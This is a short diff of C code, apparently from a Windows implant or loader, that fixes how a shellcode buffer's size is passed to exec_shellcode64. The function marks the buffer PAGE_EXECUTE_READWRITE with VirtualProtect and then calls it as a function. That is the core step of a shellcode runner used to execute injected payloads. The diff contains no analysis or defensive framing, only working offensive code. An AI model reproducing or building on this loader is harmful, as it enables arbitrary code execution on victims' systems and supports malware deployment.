@@ -6,16 +6,15 @@
 
 
 // Currently ignores payload_info
-void exec_shellcode64(unsigned char *shellcode, char *payload_info) {
-	DEBUG_PRINT("exec_shellcode64 called\n");
-	int size=strlen(shellcode);
-	DEBUG_PRINT("shellcode size: %d\n", size);
+// Requires shellcode_size for VirtualProtect call
+void exec_shellcode64(unsigned char *shellcode, int shellcode_size, char *payload_info) {
+	DEBUG_PRINT("exec_shellcode64 called\n");	
+	DEBUG_PRINT("Shellcode size: %d\n", shellcode_size);
 	
     // Check for NULL pointer to handle cases where no shellcode data was retrieved
     if(shellcode != NULL) {
-	    int len=strlen(shellcode);
-	    DWORD l=0;
-	    VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
+	    DWORD l = 0;
+	    VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE_READWRITE, &l);
 	    (* (int(*)()) shellcode)();
     }
 }
